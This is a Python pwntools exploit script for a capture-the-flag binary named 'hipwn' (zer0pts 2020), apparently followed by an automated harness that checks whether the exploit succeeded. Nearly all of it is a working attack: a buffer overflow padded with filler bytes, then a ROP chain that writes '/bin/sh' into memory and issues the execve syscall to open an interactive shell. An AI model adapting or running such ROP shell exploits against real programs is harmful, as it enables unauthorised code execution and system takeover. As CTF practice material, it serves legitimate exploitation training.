from pwn import *

import os
import sys
import signal

target = process("./chall-test_zer0pts20-hipwn")
gdb.attach(target)

payload =  ""
payload += "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p64(0x40141c)
payload += p64(0x6030b8)
payload += p64(0x400121)
payload += "/bin/sh\x00"
payload += p64(0x400704)
payload += p64(0x400121)
payload += p64(0x3b)
payload += p64(0x40141c)
payload += p64(0x6030b8)
#payload += p64(0x0)
payload += p64(0x4023f5)
payload += p64(0x0)
payload += p64(0x000000000040141a)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x4003fc)
target.sendline(payload)

target.interactive()

# Exploit Verification starts here

class ExploitTimedOut(Exception):
	pass

def timeOut(signum, frame):
	raise ExploitTimedOut()

signal.signal(signal.SIGALRM, timeOut)
signal.alarm(2)

try:
	while True:
		if os.path.exists("pwned") or os.path.exists("rip"):
			sys.exit(0)
except ExploitTimedOut:
	print("Exploit timed out")